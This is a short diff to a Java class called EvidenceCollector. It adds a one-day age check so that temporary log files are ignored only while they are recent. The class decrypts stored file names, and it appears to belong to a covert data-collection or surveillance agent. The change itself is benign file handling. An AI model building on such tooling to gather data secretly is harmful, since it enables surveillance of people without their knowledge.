@@ -421,7 +421,7 @@ public class EvidenceCollector {
 					// String encName = fcFile.getName();
 					final String plainName = decryptName(file);
 					map.put(plainName, file);
-				} else if (file.endsWith(EvidenceCollector.LOG_TMP)) {
+				} else if (file.endsWith(EvidenceCollector.LOG_TMP) && notVeryOld(fcDir, file)) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " ignoring temp file: " + file) ;//$NON-NLS-1$
 					}
@@ -447,6 +447,16 @@ public class EvidenceCollector {
 		final ArrayList<String> val = new ArrayList<String>(map.values());
 		// Collections.reverse(val);
 		return val.toArray(new String[] {});
+	}
+
+	private boolean notVeryOld(File fcDir, String file) {
+		final File toVerify = new File(fcDir, file);
+		Date now = new Date();
+		long oldFile = 1000*3600*24;
+		long elapsed = now.getTime() - toVerify.lastModified();
+		boolean young= elapsed < oldFile;
+	
+		return young;
 	}
 
 	//
